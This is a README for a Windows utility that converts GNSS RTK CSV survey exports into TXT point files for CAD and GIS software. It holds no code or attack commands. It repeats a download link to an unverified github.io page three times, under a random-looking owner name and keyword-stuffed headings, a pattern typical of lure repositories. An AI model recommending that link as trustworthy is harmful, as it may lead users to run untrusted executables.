# Extractor de Coordenadas RTK v1.2.0 - GNSS CSV to TXT converter 2026

> Windows software for converting GNSS RTK CSV exports into organized TXT point files for surveying and topographic work. Current release: 1.2.0.

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zackwdaqmoore5955/extractor-coordenadas-rtk?style=flat-square)](https://github.com/zackwdaqmoore5955/extractor-coordenadas-rtk)

---

<p align="center">
  <a href="https://zackwdaqmoore5955.github.io/extractor-coordenadas-rtk/">
    <img src="https://img.shields.io/badge/Download-Extractor%20de%20Coordenadas%20RTK%20Latest-brightgreen?style=for-the-badge" alt="Download Extractor de Coordenadas RTK">
  </a>
</p>

> **[Download Extractor de Coordenadas RTK v1.2.0](https://zackwdaqmoore5955.github.io/extractor-coordenadas-rtk/)**

---

[Download Latest Build](https://zackwdaqmoore5955.github.io/extractor-coordenadas-rtk/)

---

## What the Tool Does

Extractor de Coordenadas RTK converts GNSS RTK data exported as CSV into TXT files containing structured points. The Windows application provides a direct way to prepare field measurements for use in office surveying and topography workflows.

It is intended for situations where data from several exports needs cleanup before being used in Civil 3D, AutoCAD, or QGIS. Field selection and batch conversion help reduce repeated manual preparation when working with multiple files.

---

## Main Capabilities

- Creates structured TXT point files from GNSS RTK CSV input
- Supports dropping either individual files or complete folders into the application
- Converts multiple CSV files through batch processing
- Allows elevation and description fields to be selected for the output
- Prevents filename collisions by appending numeric suffixes to duplicate output names
- Supports point-data preparation for Civil 3D, AutoCAD, and QGIS workflows
- Suitable for surveying and topographic data processing
- Runs as a Windows desktop utility

---

## Getting Started

1. Use the download link above to obtain the current build.
2. Unpack the downloaded files into a folder on Windows.
3. Launch the application from that folder using your usual method.
4. To work from the repository source, clone the project:

   git clone https://github.com/zackwdaqmoore5955/extractor-coordenadas-rtk.git

5. Put the GNSS CSV exports in a working directory and open the application to convert them.

---

## Conversion Workflow

A standard conversion can be completed as follows:

1. Start the program on a Windows computer.
2. Drop a single CSV file or a folder containing CSV files onto the application.
3. Select the fields to use for point elevation and description.
4. Run the conversion.
5. Check the TXT point files produced, then load them into Civil 3D, AutoCAD, or QGIS.

For a larger field-data set:

- Gather the RTK CSV exports from the survey work.
- Drop the folder containing them into the application.
- Let the tool produce the TXT files in a batch.
- Continue working with those files in the applicable CAD or GIS project.

---

## Output and Preferences

Output generation is primarily controlled by field mapping. Select the elevation field and the description field that should be written into the TXT point structure.

When preferences are stored locally, use the same Windows user context for configuration and survey-data processing. Generated filenames are handled automatically; when a name is already present, the application uses a numeric suffix.

---

## System Requirements

- Windows operating system
- GNSS RTK files in CSV format
- Sufficient storage for the source CSV files and resulting TXT files
- A requirement for TXT point data compatible with Civil 3D, AutoCAD, or QGIS workflows
- A local development environment may be needed when building from repository source files

---

## Frequently Asked Questions

**Is batch conversion supported?**  
Yes. Multiple CSV files can be processed together.

**Can I provide a folder instead of one file?**  
Yes. The interface accepts both individual CSV files and complete folders through drag and drop.

**Are the output columns configurable?**  
The elevation and description fields can be selected for use in the generated TXT structure.

**How are duplicate output names handled?**  
A numeric suffix is added to the filename so an existing TXT file is not overwritten by default.

**What type of work is this application intended for?**  
It is designed for survey and topography data preparation, including workflows involving Civil 3D, AutoCAD, and QGIS.

**How can I find newer versions?**  
Download the latest build using the link above and review the repository for subsequent releases.

---

## License

This project is distributed under the GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the complete license terms.
